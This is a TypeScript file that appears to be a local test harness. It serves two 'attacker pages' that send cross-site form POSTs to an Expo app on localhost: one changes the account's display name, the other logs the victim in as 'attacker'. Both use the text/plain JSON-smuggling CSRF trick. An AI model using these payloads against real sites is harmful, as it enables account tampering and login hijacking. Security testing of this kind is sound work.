import { createServer } from 'node:http';

// Different site from the Expo app on localhost:8104
const pages: Record<string, string> = {
  '/csrf-account': `<!doctype html>
<title>Cross-site account change</title>
<form action="http://localhost:8104/csrf-account" method="POST" enctype="text/plain">
  <input type="hidden" name='{"displayName":"Changed by cross-site form","padding":"' value='"}'>
  <button>Submit cross-site change</button>
</form>`,
  '/login': `<!doctype html>
<title>Cross-site login</title>
<form action="http://localhost:8104/login" method="POST" enctype="text/plain">
  <input type="hidden" name='{"username":"attacker","password":"demo-password","padding":"' value='"}'>
  <button>Submit cross-site login</button>
</form>`,
};

createServer((request, response) => {
  response.writeHead(200, { 'Content-Type': 'text/html' });
  response.end(pages[request.url!]);
}).listen(8105, '127.0.0.1', () => {
  console.log('Attacker pages: http://127.0.0.1:8105/csrf-account, http://127.0.0.1:8105/login');
});
